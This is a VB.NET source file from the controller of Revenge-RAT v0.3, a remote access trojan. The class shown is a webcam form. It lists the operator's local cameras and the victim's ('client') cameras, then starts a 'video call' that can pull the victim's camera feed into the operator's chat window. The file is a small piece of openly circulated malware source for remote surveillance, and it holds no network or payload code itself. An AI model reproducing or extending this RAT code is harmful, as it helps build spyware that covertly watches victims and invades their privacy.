Imports AForge.Video.DirectShow
Imports Microsoft.VisualBasic.CompilerServices
Public Class WCV
    Private FuenteDeVideo As VideoCaptureDevice
    Public Devices As String
    Private Shared DispositivosDeVideo As FilterInfoCollection = New FilterInfoCollection(FilterCategory.VideoInputDevice)
    Public OS As Integer
    Public Sock As Integer
    Public Sub New()
        Me.Devices = String.Empty
        Me.FuenteDeVideo = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub q_Scroll(sender As Object, e As EventArgs) Handles q.Scroll
        Me.Label4.Text = (Conversions.ToString(Me.q.Value) & "%")
    End Sub

    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click
        If Operators.ConditionalCompareObjectEqual(Me.AWCD.SelectedItem, "Null", False) Then
            MessageBox.Show("You must select your device!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf Operators.ConditionalCompareObjectEqual(Me.AWCD.SelectedItem, Nothing, False) Then
            MessageBox.Show("You must select your device!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf Operators.ConditionalCompareObjectEqual(Me.CWCD.SelectedItem, "Null", False) Then
            MessageBox.Show("You must select client device!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf Operators.ConditionalCompareObjectEqual(Me.CWCD.SelectedItem, Nothing, False) Then
            MessageBox.Show("You must select client device!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf ((Me.AWCD.Items.Item(Me.AWCD.SelectedIndex).ToString = "Null") And (Me.CWCD.Items.Item(Me.CWCD.SelectedIndex).ToString = "Null")) Then
            MessageBox.Show("You must select your- client device!, you both dont have a cam!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Me.Close()
        Else
            Dim ch As CH = DirectCast(My.Application.OpenForms.Item(("Chat" & Conversions.ToString(Me.OS))), CH)
            ch.Old = ch.PictureBox2.Image
            If (Me.AWCD.Items.Item(Me.AWCD.SelectedIndex).ToString <> "Null") Then
                ch.ToolStripButton10.Text = "Stop video call"
                ch.ToolStripButton10.Image = My.Resources._1478078555_webcam_delete
                ch.Q = Me.q.Value
                ch.C(Me.AWCD.SelectedIndex)
            End If
            If (Me.CWCD.Items.Item(Me.CWCD.SelectedIndex).ToString = "Null") Then
                ch.Pic.Visible = False
                ch.TableLayoutPanel6.RowStyles.Item(1).SizeType = SizeType.Percent
                ch.TableLayoutPanel6.RowStyles.Item(0).SizeType = SizeType.AutoSize
            Else
                ch.Pic.Visible = True
                ch.TableLayoutPanel6.RowStyles.Item(0).SizeType = SizeType.Percent
                ch.TableLayoutPanel6.RowStyles.Item(1).SizeType = SizeType.Absolute
                ch.SK(Me.CWCD.SelectedIndex)
            End If
            Me.Close()
        End If
    End Sub

    Private Sub WCV_Load(sender As Object, e As EventArgs) Handles Me.Load
        If (WCV.DispositivosDeVideo.Count = 0) Then
            Me.AWCD.Items.Add("Null")
        Else
            Dim num3 As Integer = (WCV.DispositivosDeVideo.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num3)
                Me.AWCD.Items.Add(WCV.DispositivosDeVideo.Item(i).Name.ToString)
                i += 1
            Loop
        End If
        If (Me.Devices = "Null") Then
            Me.CWCD.Items.Add("Null")
        Else
            Dim strArray As String() = Strings.Split(Me.Devices, "|", -1, CompareMethod.Binary)
            Dim num4 As Integer = (strArray.Length - 2)
            Dim j As Integer = 0
            Do While (j <= num4)
                Me.CWCD.Items.Add(strArray(j))
                j += 1
            Loop
        End If
    End Sub
End Class